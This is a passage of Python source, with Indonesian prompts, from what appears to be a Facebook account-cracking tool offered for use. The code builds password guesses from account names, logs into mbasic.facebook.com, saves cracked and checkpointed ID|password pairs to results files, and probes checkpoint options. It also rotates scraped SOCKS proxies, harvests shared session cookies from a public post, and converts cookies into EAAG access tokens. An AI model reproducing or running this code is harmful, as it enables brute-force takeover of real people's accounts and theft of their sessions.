PQOdT-N4_Bqwzu1kCIanP4rIYhzF8XsFjVt0ygH7Xv9kDDI2xifFdhmfNEEG0s91VRP0_3cLzIXEY0MLgpyvQ4qI6_KMGCTKnCUBsAnxhy9Dzj3pAJ5XcWVxp6UFihIk1czVytY_bQ_oBu4eHzWp8kXQeO_W34TJPJKrzvnyNDMpKKUKaaOl3kNPLvggYm5I5vb7kOk-KnIQgWy5vS2-M9MIOEQLiQBa58eig2tfBP9bVDRQ6xzeNghsXBO_HsX4UwLqdfLz0EbpplEIELjKRpzgDnr7hYN1sM4wvVmHMr98VROyWrNxc7Wy1FjxKeSl__wVLXxeIVg8SPa9kBr_hKJ6-3rQQUdHr6N7TqgXceyF9CTa1JDC9gKrN7oVCR9XfnN6hKmWA4T9mFOO5Dd5UYRAp6FlpjnHyv5dtsvRWfcA7RFC9nUTAXhGwODXxBNpY8BGc7Xh8vTDwTKqmsyUQN5V1czX8bxLhsWVLODZhaI37hREsTOLT5nHOrg0NYNcc-s80UANkPOpcpu_yQDko1fBGR3-ARPgRiLT4GX59glmvFSIIoVb9LnXT8-tRDBA"]
		elif hu in ['4','04']:
			#Bryanly
			link_app=["https://m.facebook.com/v3.2/dialog/oauth?app_id=546387748750105&auth_type=rerequest&cbt=1660007160700&channel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df2fb47fad7408cc%26domain%3Dbrainly.co.id%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fbrainly.co.id%252Ff255ac1c9862044%26relation%3Dopener&client_id=546387748750105&display=touch&domain=brainly.co.id&e2e=%7B%7D&fallback_redirect_uri=https%3A%2F%2Fbrainly.co.id%2Ftugas%2F14548632&locale=en_US&logger_id=f2c7c938fdf214c&origin=2&redirect_uri=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df1ee54b6e463df4%26domain%3Dbrainly.co.id%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fbrainly.co.id%252Ff255ac1c9862044%26relation%3Dopener%26frame%3Df2e29c41357b38&response_type=token%2Csigned_request%2Cgraph_domain&return_scopes=true&scope=public_profile%2C%20email&sdk=joey&version=v3.2"]
		elif hu in ['5','05']:
			#Hings Domino
			link_app=["https://m.facebook.com/v8.0/dialog/oauth?cct_prefetching=0&client_id=345000986033587&cbt=1660008418088&e2e=%7B%22init%22%3A1660008418088%7D&ies=1&sdk=android-8.2.0&sso=chrome_custom_tab&scope=public_profile%2Cuser_gender%2Cuser_friends&state=%7B%220_auth_logger_id%22%3A%22eb1f7549-f6ec-4e30-9e92-979a5a8b685f%22%2C%223_method%22%3A%22custom_tab%22%2C%227_challenge%22%3A%2254e2vochhlvsm0areh4t%22%7D&default_audience=friends&login_behavior=NATIVE_WITH_FALLBACK&redirect_uri=fb345000986033587%3A%2F%2Fauthorize&auth_type=rerequest&response_type=token%2Csigned_request%2Cgraph_domain&return_scopes=true"]
		elif hu in ['6','06']:
			#Yandex
			link_app=["https://m.facebook.com/v12.0/dialog/oauth?cct_prefetching=0&client_id=216570901687097&cbt=1660268970371&e2e=%7B%22init%22%3A1660268970371%7D&ies=0&sdk=android-12.2.0&sso=chrome_custom_tab&nonce=30032935-4997-43a5-abac-0d2c6cae81d5&scope=user_birthday%2Cuser_likes%2Copenid%2Cuser_link%2Cuser_gender%2Cemail&state=%7B%220_auth_logger_id%22%3A%2226cb2987-4616-4361-90ff-ab55b956e68f%22%2C%223_method%22%3A%22custom_tab%22%2C%227_challenge%22%3A%225le280ansood69lmdd9e%22%7D&default_audience=friends&login_behavior=NATIVE_WITH_FALLBACK&redirect_uri=fbconnect%3A%2F%2Fcct.ru.yandex.searchplugin&auth_type=rerequest&response_type=id_token%2Ctoken%2Csigned_request%2Cgraph_domain&return_scopes=true"]
		elif hu in ['7','07']:
			link_app=["https://m.facebook.com/v8.0/dialog/oauth?cct_prefetching=0&client_id=345000986033587&cbt=1660008418088&e2e=%7B%22init%22%3A1660008418088%7D&ies=1&sdk=android-8.2.0&sso=chrome_custom_tab&scope=public_profile%2Cuser_gender%2Cuser_friends&state=%7B%220_auth_logger_id%22%3A%22eb1f7549-f6ec-4e30-9e92-979a5a8b685f%22%2C%223_method%22%3A%22custom_tab%22%2C%227_challenge%22%3A%2254e2vochhlvsm0areh4t%22%7D&default_audience=friends&login_behavior=NATIVE_WITH_FALLBACK&redirect_uri=fb345000986033587%3A%2F%2Fauthorize&auth_type=rerequest&response_type=token%2Csigned_request%2Cgraph_domain&return_scopes=true",
			"https://m.facebook.com/v3.2/dialog/oauth?app_id=546387748750105&auth_type=rerequest&cbt=1660007160700&channel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df2fb47fad7408cc%26domain%3Dbrainly.co.id%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fbrainly.co.id%252Ff255ac1c9862044%26relation%3Dopener&client_id=546387748750105&display=touch&domain=brainly.co.id&e2e=%7B%7D&fallback_redirect_uri=https%3A%2F%2Fbrainly.co.id%2Ftugas%2F14548632&locale=en_US&logger_id=f2c7c938fdf214c&origin=2&redirect_uri=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df1ee54b6e463df4%26domain%3Dbrainly.co.id%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fbrainly.co.id%252Ff255ac1c9862044%26relation%3Dopener%26frame%3Df2e29c41357b38&response_type=token%2Csigned_request%2Cgraph_domain&return_scopes=true&scope=public_profile%2C%20email&sdk=joey&version=v3.2",
			"https://m.facebook.com/v3.2/dialog/oauth?app_id=546387748750105&auth_type=rerequest&cbt=1660007160700&channel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df2fb47fad7408cc%26domain%3Dbrainly.co.id%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fbrainly.co.id%252Ff255ac1c9862044%26relation%3Dopener&client_id=546387748750105&display=touch&domain=brainly.co.id&e2e=%7B%7D&fallback_redirect_uri=https%3A%2F%2Fbrainly.co.id%2Ftugas%2F14548632&locale=en_US&logger_id=f2c7c938fdf214c&origin=2&redirect_uri=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df1ee54b6e463df4%26domain%3Dbrainly.co.id%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fbrainly.co.id%252Ff255ac1c9862044%26relation%3Dopener%26frame%3Df2e29c41357b38&response_type=token%2Csigned_request%2Cgraph_domain&return_scopes=true&scope=public_profile%2C%20email&sdk=joey&version=v3.2",
			"https://auth.booyah.live/oauth/login?client_id=10058&redirect_uri=https%3A%2F%2Fbooyah.live%2Flogin&response_type=token&platform=3&locale=en-GB&state=return_url%3Dhttps%3A%2F%2Fbooyah.live%2F",
			"https://m.facebook.com/v3.3/dialog/oauth?encrypted_query_string=AeDT2UXYR_53fiXztzu_JhFEBFfSJQgdUJGUXpWNi06kMvyZabZnxfdBZhZqn0UVav0tMQhs1d-jJsCtyUwNApPh-rjYgugWqF-e66qARB91xP624bvOxSjswdmzxS1zgvH4Ojj2MOEEW-Qi3bMycxfp8etyXlIdau3ppuAyyDbEBSIyiWvpC8Fl0k72v7CPgmvEGr6EvqJJ3P96Cmtf4nAFS8qWpLS3hwVpvr-cYADOlLya0mpQybTQ47egOAscvQV6EJZGU0gf4ptTfXhpcIb_ZLZh0gOKDftQzztpwa5jzDXQyiMFC94hijWNafrhSEZ8WtfinBYZkUVU4hbjM6CDzdO14HDUlHa-_QU3aQQo-V1wpnndx0cE1pNbOSuLpyW0E6q5MJ8qRZ7J2uX4PcmjsOBHRfOWA1hsBPQrHPnWoVidw8Lk67C4b9ult5CY578K5fHL447X3Wjq3jXxdSCEPNL-MLpW0bsjPM3-cNC1X9oYB6AjxpToI6zqS5ML-eRsA5VVeB89eS2X4xxcgveP2oOnFWUMyqQS7Ma1guZvlRvCc9rK7elLXdljMd743YV6RJLg7l_wGelvrdbGJAClrZQN2NPuvxLfUyOwIblHTTZ21mA8diwCfRFkmwbbg30y9ry6wN39pTXZdZlGEuoQezQO1qgJD845j2oGD057s9p3S-p10ljHw-eYOvx8u6gMFdWPmbmKIF6KKkJhdzwGh1JDoWRjmxvcXiZal1VM4S8ZE99uIM54eNlpB0wxcVVJZ92j72g4mc_75e1fEfhQw1ZSPlrfq4Auc3bYQFMZ7x87n8_Buv_V-33jSjl0XyXNUk9UQlRVLztDgihIRspczT94fGzhzksV0ASf0a9pyaYTrbsHjK_o7tGxLtCqneuiooMwvds0VB9BgpwlwhVMmotgV881fyZ-9Ge_CAYXenAoGUJMufxZ-P5FGIpWRy5XmJ6ZiE9KsnV2m2W11ZUDYozAHF_aiVjT3AxhN9tAyKv4shU0ChnURwPQOdT-N4_Bqwzu1kCIanP4rIYhzF8XsFjVt0ygH7Xv9kDDI2xifFdhmfNEEG0s91VRP0_3cLzIXEY0MLgpyvQ4qI6_KMGCTKnCUBsAnxhy9Dzj3pAJ5XcWVxp6UFihIk1czVytY_bQ_oBu4eHzWp8kXQeO_W34TJPJKrzvnyNDMpKKUKaaOl3kNPLvggYm5I5vb7kOk-KnIQgWy5vS2-M9MIOEQLiQBa58eig2tfBP9bVDRQ6xzeNghsXBO_HsX4UwLqdfLz0EbpplEIELjKRpzgDnr7hYN1sM4wvVmHMr98VROyWrNxc7Wy1FjxKeSl__wVLXxeIVg8SPa9kBr_hKJ6-3rQQUdHr6N7TqgXceyF9CTa1JDC9gKrN7oVCR9XfnN6hKmWA4T9mFOO5Dd5UYRAp6FlpjnHyv5dtsvRWfcA7RFC9nUTAXhGwODXxBNpY8BGc7Xh8vTDwTKqmsyUQN5V1czX8bxLhsWVLODZhaI37hREsTOLT5nHOrg0NYNcc-s80UANkPOpcpu_yQDko1fBGR3-ARPgRiLT4GX59glmvFSIIoVb9LnXT8-tRDBA",
			"https://m.facebook.com/v12.0/dialog/oauth?cct_prefetching=0&client_id=216570901687097&cbt=1660268970371&e2e=%7B%22init%22%3A1660268970371%7D&ies=0&sdk=android-12.2.0&sso=chrome_custom_tab&nonce=30032935-4997-43a5-abac-0d2c6cae81d5&scope=user_birthday%2Cuser_likes%2Copenid%2Cuser_link%2Cuser_gender%2Cemail&state=%7B%220_auth_logger_id%22%3A%2226cb2987-4616-4361-90ff-ab55b956e68f%22%2C%223_method%22%3A%22custom_tab%22%2C%227_challenge%22%3A%225le280ansood69lmdd9e%22%7D&default_audience=friends&login_behavior=NATIVE_WITH_FALLBACK&redirect_uri=fbconnect%3A%2F%2Fcct.ru.yandex.searchplugin&auth_type=rerequest&response_type=id_token%2Ctoken%2Csigned_request%2Cgraph_domain&return_scopes=true"]
		else:
			kotak("# KONCOL TINGGAL PILIH 1-5 ITU AJA SUSAH, AJIM",C,Q)
			time.sleep(2)
			self.pilih_next()



	def pilih_fps(self):
		global fps
#		tod = me()
#		tod.add_column("NO", style=I, justify="center")
#		tod.add_column("PILIHAN", style=C, justify="center", width=60)
#		tod.add_row(f"1\n2",f"B-API\n{UU}MOBILE{QQ}/{KK}MBASIC{QQ}/{MM}FREE{QQ}/{II}P{QQ}/{KK}X{QQ}")
#		sol().print(tod, justify='center')
#		hu = input(f'>--{c}Pilih 1-2{q}--> ')
		hu="2"
		if hu in ['1','01']:
			fps = "fast"
		elif hu in ['2','02']:
			fps = "kontol"
		else:
			kotak("# KONCOL TINGGAL PILIH 1-2 ITU AJA SUSAH, AnJIM",C,Q)
			time.sleep(2)
			self.pilih_fps()


	def tanya_prox_k(self):
		global prox_k
		iprint(Panel(f'{CC}Apakah Anda Ingin Menggunkan Proxy{QQ}'))
		kp = input(f'>--Y/n--> ')
		if kp in [""," "]:
			kotak("# JANGAN KOSONG KONTOL", M,Q)
			time.sleep(3),self.tanya_apk()
		elif kp in ["y","Y"]:
			prox_k = "Risky_Ganteng"
		elif kp in ["n","N"]:
			prox_k = "PEPEK"

		else:
			tod = f"{MM}Maaf Pilihan {QQ}[{CC}{kp}{QQ}] {MM}Anda Tidak Tersedia.."
			iprint(Panel(tod, style=Q))
			time.sleep(3),self.tanya_prox_k()


	def tanya_opsi(self):
		global opsi_y
		iprint(Panel(f'{CC}Apakah Anda Ingin Menampilkan Opsi Sesi Akun{QQ}'))
		kp = input(f'>--Y/n--> ')
		if kp in [""," "]:
			kotak("# JANGAN KOSONG KONTOL", M,Q)
			time.sleep(3),self.tanya_apk()
		elif kp in ["y","Y"]:
			opsi_y = "IYA"
		elif kp in ["n","N"]:
			opsi_y = "PEPEK"

		else:
			tod = f"{MM}Maaf Pilihan {QQ}[{CC}{kp}{QQ}] {MM}Anda Tidak Tersedia.."
			iprint(Panel(tod, style=Q))
			time.sleep(3),self.tanya_opsi()
	def tanya_apk(self):
		global apk_me
		iprint(Panel(f"{CC}Apakah Anda Ingin Menampilkan Aplikasi{QQ}({KK}Tidak Recommended{QQ})", style=Q, title="PEPEK ENGGA DIBACA"))
		kp = input(f'>--Y/n--> ')
		if kp in [""," "]:
			kotak("# JANGAN KOSONG KONTOL", M,Q)
			time.sleep(3),self.tanya_apk()
		elif kp in ["y","Y"]:
			apk_me = "IYA"
		elif kp in ["n","N"]:
			apk_me = "PEPEK"

		else:
			tod = f"{MM}Maaf Pilihan {QQ}[{CC}{kp}{QQ}] {MM}Anda Tidak Tersedia.."
			iprint(Panel(tod, style=Q))
			time.sleep(3),self.tanya_apk()
	def pas_me(self):
		global pass_
		iprint(Panel(f"{CC}Silahkan Pilih Kombinasi Password Crack{QQ}", style=Q, title="BACA DULU KONTOL"))
		wwe = me()
		wwe.add_column("NO", style=K, justify="center")
		wwe.add_column("PILIHAN", style=C, justify="center", width=60)
		wwe.add_row("1\n2\n3\n4\n5\n6", "name123,name12345\nname,name123,name1234,name12345\nname,name123,name12345,sayang,anjing,kontol\nname,name123,name12345 + 6 Password\nname,name123,name1234,name12345 + MANUAL\nMANUAL")
		sol().print(wwe, justify='center')
		kol = input(f">--Pilih 1-4--> ")
		if kol in [" ",""]:
			kotak("# JANGAN KOSONG KONTOL", M,Q)
			time.sleep(3),self.pas_me()
		elif kol in ["1","01"]:
			pass_ = "1"
		elif kol in ["2","02"]:
			pass_ = "2"
		elif kol in ["3","03"]:
			pass_ = "3"
		elif kol in ["4","04"]:
			pass_ = "4"
		elif kol in ["5","05"]:
			pass_ = "5"
			kotak("# GUNAKAN , (koma) Untuk Pemisah Password Dan Minimal Pass 6 Huruf/Angka",I,M)
			pwx = input(f">--{k}Password{q}--> ")
			if pwx == '':
				kotak("# JANGAN KOSONG, KONTOL BIG",M,Q)
				time.sleep(3),self.pas_me()
			elif len(pwx)<=5:
				kotak("# MINIMAL PASSWORD HARUS LEBIH DARI 5 HURUF/ANGKA",K,Q)
				time.sleep(3),self.pas_me()
			else:
				pass_man=pwx

		elif kol in ["6","06"]:
			pass_ = "6"
			kotak("# GUNAKAN , (koma) Untuk Pemisah Password Dan Minimal Pass 6 Huruf/Angka",I,M)
			pwx = input(f">--{k}Password{q}--> ")
			if pwx == '':
				kotak("# JANGAN KOSONG, KONTOL BIG",M,Q)
				time.sleep(3),self.pas_me()
			elif len(pwx)<=5:
				kotak("# MINIMAL PASSWORD HARUS LEBIH DARI 5 HURUF/ANGKA",K,Q)
				time.sleep(3),self.pas_me()
			else:
				pass_man=pwx

		else:
			tod = f"{MM}Maaf Pilihan {QQ}[{CC}{kol}{QQ}] {MM}Anda Tidak Tersedia.."
			iprint(Panel(tod, style=Q))
			time.sleep(3),self.pas_me()

def ubah_cok(cookie):
	try:
		cok = ('sb=%s;datr=%s;c_user=%s;xs=%s;fr=%s'%(cookie['sb'],cookie['datr'],cookie['c_user'],cookie['xs'],cookie['fr']))
	except:
		cok=cookie
	return(str(cok))
def get_apk(user,pw,cok):
	cookie = {"cookie":cok}
	ok_ = Tree("               ",highlight=True, hide_root=True)
	ok__= ok_.add(f":bolivia::oman: {o}AKUN OK NI BOZZ{q}",guide_style="uu green")

	ok___ = ok__.add(f"{b}ID DAN PASSWORD{q}")
	ok___.add(f"\r{i}{user}{q}|{i}{pw}{q}")

	ok___ = ok__.add(f"{b}COOKIES{q}")
	ok___.add(f"{c}{cok}{q}")


	try:
		active = Tree(f"\r{b}Aplikasi Aktif{q}:")
		url = "https://mbasic.facebook.com/settings/apps/tabbed/?tab=active"
		get_active(url,active,cookie)
	except Exception as e:
		print(e)
	try:
		inactive = Tree(f"\r{b}Aplikasi Tidak Aktif{q}:")
		url = "https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive"
		get_inactive(url,inactive,cookie)
	except Exception as e:
		print(e)
	ok__.add(active)
	ok__.add(inactive)

	code="""Wans X Gans
Jeck X Nano
Xenzi Ganz
Radhin Al Haady
Zee K World
Moch Aang Ardiansyah XD.
Risky"""
	pyhon = Syntax(code, "python", theme="monokai", line_numbers=True)
	ok____= ok__.add(f"{b}Thanks To:{q}")
	ok____.add(Group(pyhon))
	prints(ok__)



def get_active(url,active,cookie):
	try:
		data = parser(ses.get(url,cookies=cookie).text,"html.parser")
		for apk in data.find_all("h3"):
			if "Ditambahkan" in apk.text:
				active.add(f"\r{i}{str(apk.text).replace('Ditambahkan',' Ditambahkan')}{q}")
			else:continue
		next = "https://mbasic.facebook.com" + data.find("a",string="Lihat Lainnya")["href"]
		get_active(next,active,cookie)
	except:pass

def get_inactive(url,inactive,cookie):
	try:
		data = parser(ses.get(url,cookies=cookie).text,"html.parser")
		for apk in data.find_all("h3"):
			if "Kedaluwarsa" in apk.text:
				inactive.add(f"\r{m}{str(apk.text).replace('Kedaluwarsa',' Kedaluwarsa')}{q}")
			else:continue
		next = "https://mbasic.facebook.com" + data.find("a",string="Lihat Lainnya")["href"]
		get_inactive(next,inactive,cookie)
	except:pass

def ubah_bahasa(cookie):
	try:
		url = ses.get('https://mbasic.facebook.com/language/',cookies=cookie)
		data = parser(url.text,'html.parser')
		for x in data.find_all('form',{'method':'post'}):
			if 'Bahasa Indonesia' in str(x):
				bahasa = {"fb_dtsg" : re.search('name="fb_dtsg" value="(.*?)"',str(url.text)).group(1),"jazoest" : re.search('name="jazoest" value="(.*?)"', str(url.text)).group(1),"submit"  : "Bahasa Indonesia"}
				eksekusi = ses.post('https://mbasic.facebook.com' + x['action'],data=bahasa,cookies=cookie)
	except:pass



def cekfile_crk(folder):
	dirs = os.listdir(folder)
	god_cp,god_ok="",""
	for file in dirs:
		filex = (folder+"/"+file)
		try:
			juma = open(filex,"r").readlines()
			total = ("%s"%(str(len(juma))))
		except:total = (" ?? ")
		try:
			ijo__ = filex.split("results/OK-")[1]
			ijo_ = (QQ+II+"results/OK-"+ijo__)
			god_ok += (ijo_+QQ+" <--|--> "+QQ+MM+total+QQ+"\n")
		except:pass
		try:
			kuning__ = filex.split("results/CP-")[1]
			kuning_ = (QQ+KK+"results/CP-"+kuning__)
			god_cp += (kuning_+QQ+" <--|--> "+QQ+MM+total+QQ+"\n")
		except:pass
	iprint(Panel(god_ok, style=I, title="RESULTS OK"))
	iprint(Panel(god_cp, style=K, title="RESULTS CP"))
	print()



def hide_opsi(user,pe,tlt):
	ok_ = Tree("                                 ",highlight=True, hide_root=True)
	ok__= ok_.add(f":bolivia::oman:",guide_style="uu red")
	ok___= ok__.add(f"{b}Id{q} Dan {b}Password{q}")
	ok___.add(f"{o}{user}{q}|{o}{pe}{q}|{q}{tlt}{q}")


	opsi= ok__.add("Option")
	check_op(user,pe,tlt,opsi)


	prints(ok__)
def check_op(userrz,pwz,ttl,opsi):
	try:
		host = "https://mbasic.facebook.com"
		ua = "Mozilla/5.0 (Linux; Android 11; vivo 1904 Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.106 Mobile Safari/537.36"
		ses = requests.Session()
		ses.headers.update({
		"Host": "mbasic.facebook.com",
		"cache-control": "max-age=0",
		"upgrade-insecure-requests": "1",
		"origin": host,
		"content-type": "application/x-www-form-urlencoded",
		"user-agent": ua,
		"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
		"x-requested-with": "mark.via.gp",
		"sec-fetch-site": "same-origin",
		"sec-fetch-mode": "navigate",
		"sec-fetch-user": "?1",
		"sec-fetch-dest": "document",
		"referer": host+"/login/?next&ref=dbl&fl&refid=8",
		"accept-encoding": "gzip, deflate",
		"accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
		})
		data = {}
		ged = par(ses.get(host+"/login/?next&ref=dbl&fl&refid=8", headers={"user-agent":ua}).text, "html.parser")
		fm = ged.find("form",{"method":"post"})
		list = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login","bi_xrwh"]
		for i in fm.find_all("input"):
			if i.get("name") in list:
				data.update({i.get("name"):i.get("value")})
			else:
				continue
		data.update({"email":userrz,"pass":pwz})
		try:
			run = par(ses.post(host+fm.get("action"), data=data, allow_redirects=True).text, "html.parser")
		except requests.exceptions.TooManyRedirects:
			opsi.add(f"{m}Akun Ini Terkenak Spam{q}")
		if "c_user" in ses.cookies:
			opsi.add(f"{u}Akun Ini Tidak CheckPointint😱😱{q}")
			open('results/OK-'+durasi+'.txt','a').write(userrz+"|"+pwz+"\n")
		elif "checkpoint" in ses.cookies:
			form = run.find("form")
			dtsg = form.find("input",{"name":"fb_dtsg"})["value"]
			jzst = form.find("input",{"name":"jazoest"})["value"]
			nh   = form.find("input",{"name":"nh"})["value"]
			dataD = {
			"fb_dtsg": dtsg,
			"fb_dtsg": dtsg,
			"jazoest": jzst,
			"jazoest": jzst,
			"checkpoint_data":"",
			"submit[Continue]":"Lanjutkan",
			"nh": nh
			}
			xnxx = par(ses.post(host+form["action"], data=dataD).text, "html.parser")
			ngew = [yy.text for yy in xnxx.find_all("option")]
			if(str(len(ngew))=="0"):
				opsi.add(f"{u}SELAMAT AKUN INI TAP YES 😎 {q}({b}Login Difb Lite/Mbasic{q})")
				open('results/TAP-'+durasi+'.txt','a').write(userrz+"|"+pwz+"|"+ttl+"\n")
			else:
				jml="%s%s"%(k,str(len(ngew)))
				opsi_ = opsi.add(f"\r{b}Jumlah Opsi {jml} {q}")
				for opt in range(len(ngew)):
					jo = str(opt+1)
					opsi_.add(f"{k}{jo}{q}. {b}{ngew[opt]}{q}")
				open('results/CP-'+durasi+'.txt','a').write(userrz+"|"+pwz+"|"+ttl+"\n")
		elif "login_error" in str(run):
			oh = run.find("div",{"id":"login_error"}).find("div").text
			opsi.add(f"{k}{oh}{q}")
		else:
			opsi.add(f"\r{m}Password Akun Ini Sudah DiGanti{q}")
	except Exception as c:
		opsi.add(f"{m}Ups.. Sepertinya Akun Ini Tidak Bisa DiCheck!!{q}")
		open('results/CP-'+durasi+'.txt','a').write(userrz+"|"+pwz+"|"+ttl+"\n")




def get_proxy_socks5():
	max_proxy = "100000"
	kontol_prox = ['https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks5&timeout=100000&country=all&ssl=all&anonymity=all']
#	kontol_prox = ["https://api.proxyscrape.com/?request=displayproxies&protocol=socks5&timeout={max_proxy}&country=all&ssl=all&anonymity=all","https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks5&timeout={max_proxy}&country=all&ssl=all&anonymity=all","https://api.proxyscrape.com/?request=displayproxies&protocol=all&timeout={max_proxy}&country=all&ssl=all&anonymity=all"]
	open("data/prox_socks5.txt","w")
	for name_prox in kontol_prox:
		try:
			proxz = requests.get(name_prox).text.strip()
			open("data/prox_socks5.txt","a").write(proxz)
			file = open("data/prox_socks5.txt","r").readlines()
			for crot in file:
				crot = crot.replace("\n","")
				prox_.append(crot)
		except requests.exceptions.ConnectionError:
			kotak("# UPS... SEPERTINYA JARINGAN ANDA TERPUTUS",M,C)
			os.sys.exit()
def get_proxy_socks4():
	try:
		proxf = requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
		open("data/prox_socks4.txt",'w').write(proxf)
	except requests.exceptions.ConnectionError:
		kotak("# UPS... SEPERTINYA JARINGAN ANDA TERPUTUS",M,C)
		os.sys.exit()

def free_cookies():
	ses = requests.Session()
	url = parser(ses.get("https://www.facebook.com/100032386028880/posts/674525870303608").text,"html.parser")
	data = re.findall('"text":"(.*?)"',str(url))
	cokxyz = []
	n = 0
	for cok in data:
		if len(cok)>=20:
			try:
				if cok in cokxyz:pass
				else:
					n +=1
					cokxyz.append(cok)
					print(f"{k}{n}{q}. Cookies : {c}{cok}{q}")
			except:continue
	ask = input(f"{q}Pilih Cookies : ")
	try:
		cookie = cokxyz[int(ask)-1]
		convert_token(cookie)
		open_role()
		yz  = requests.Session().get('https://graph.facebook.com/me?fields=name,id&access_token=%s'%(tiktok),cookies=puput)
		zxc = json.loads(yz.text)
		nama= zxc["name"]
		kotak(f"# Selamat Datang {nama}.... Semoga Token Anda Awet", I, Q)
		iprint(Panel("Berhasil Login Menggunakan Cookies !!!\nSilahkan Ketik : python main.py"))
		os.sys.exit()
	except Exception as e:
		prints(Panel(f"{MM}Maaf Terjadi Kesalahan!!",width=80,style=M))
		os.sys.exit()

def login():
	AL = pilih([II,KK,MM,UU,JJ,OO,QQ])
	logox = f"""{AL}______ _______ ______________________   __\n___  / __  __ \__  ____/____  _/___  | / /\n__  /  _  / / /_  / __   __  /  __   |/ /        {CC}•{MM}MODE IN INDONESIA{CC}•{AL}\n_  /___/ /_/ / / /_/ /  __/ /   _  /|  /\n/_____/\____/  \____/   /___/   /_/ |_/"""
	iprint(Panel(logox, style=Q, title=f"{CC}Login Menggunakan Cookies{QQ}"))
	tod = me()
	tod.add_column("NO", style=I, justify="center")
	tod.add_column("PILIHAN", style=C, justify="center", width=60)
	tod.add_column("STATUS", style=K, justify="center")
	tod.add_row(f"1\n2","Free Cookies\nLogin Cookies",f"{II}ONN{QQ}\n{II}ONN{QQ}")
	sol().print(tod, justify='center')
	pil=input(f">--Pilih 1-2--> {q}")
	if pil in ("1","01"):
		free_cookies()
#		os.sys.exit("udah dibilang maintenance !")
	elif pil in ("02","2"):
		os.system("clear")
		login_cok();os.sys.exit()
	else:
		kotak("# MAAF PILIHAN YANG ANDA PILIH TIDAK ADA !!",M,Q);time.sleep(3)
		login()

def login_cok():
	AL = pilih([II,KK,MM,UU,JJ,OO,QQ])
	logox = f"""{AL}______ _______ ______________________   __\n___  / __  __ \__  ____/____  _/___  | / /\n__  /  _  / / /_  / __   __  /  __   |/ /        {CC}•{MM}MODE IN INDONESIA{CC}•{AL}\n_  /___/ /_/ / / /_/ /  __/ /   _  /|  /\n/_____/\____/  \____/   /___/   /_/ |_/"""
	iprint(Panel(logox, style=Q, title=f"{CC}Login Menggunakan Cookies{QQ}"))
	kotak("# MASUKAN COOKIES ANDA YANG MASIH FRESH/BARU DIAMBIL", K,Q)
	try:
		cokex = input(f">--{c}COOKIES ANDA{q}--> ")
		kotak("# MOHON BERSABAR SEDANG MENGUBAH COOKIES KETOKEN FACEBOOK",K,Q)
		if cokex in [" ",""]:
			kotak('# Jangan Kosong Ngab...');time.sleep(3)
			login()

		user = cokex.split("c_user=")[1]
		try:
			user = user.split(";")[0]
		except:
			user = ""
		kukis_sus = cokex
		kukis_sus = kukis_sus.replace("noscript=1", "")
		kukis_impos = ""
		kukis_sus = kukis_sus.replace("c_user="+user+";", "")
		kukis_sus = kukis_sus.replace(";c_user="+user+";", "")
		kukis_sus = kukis_sus.replace(";c_user="+user, "")
		kukis_sus = kukis_sus.replace("c_user="+user, "")
		kukis_impos += kukis_sus
		kukis_impos += ";"
		kukis_impos += "c_user="
		kukis_impos += user
		coki = kukis_impos
		_cookie = kukis_impos
		try:
			convert_token(_cookie)
			open_role()
			yz  = requests.Session().get('https://graph.facebook.com/me?fields=name,id&access_token=%s'%(tiktok),cookies=puput)
			zxc = json.loads(yz.text)
			nama= zxc["name"]
			kotak(f"# Selamat Datang {nama}.... Semoga Token Anda Awet", I, Q)
			iprint(Panel("Berhasil Login Menggunakan Cookies !!!\nSilahkan Ketik : python main.py"))
		except Exception as e:
			print(str(e))
			try:os.system("rm -f data/login.txt")
			except:pass
			try:os.system("rm -f data/cookie.txt")
			except:pass
			kotak(f"# MAAF SEPERTINYA COOKIES ANDA ERROR {str(e)}", M, Q)
		os.sys.exit()
	except Exception as e:
		kotak(f"# ERROR : {e}", M, Q)
		os.sys.exit()
class convert_token:
	def __init__(self, kues):
		global kukis_,kukis
		kukis_ = kues
		kukis = {'cookie':kukis_}
		self.__eaag__()
	def __eaag__(self):
		sus = requests.Session()
		sus_ = sus.get("https://business.facebook.com/business_locations",headers = {"user-agent":"Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","content-type":"text/html; charset=utf-8"},cookies = {"cookie":kukis_})
		hasil_ = (re.findall("(EAAG\w+)", sus_.text))
		if len(hasil_) == 0:
			kotak("# MOHON MAAF, SEPERTINYA COOKIES ANDA TIDAK BISA DIUBAH KETOKEN EAAG",M,Q)
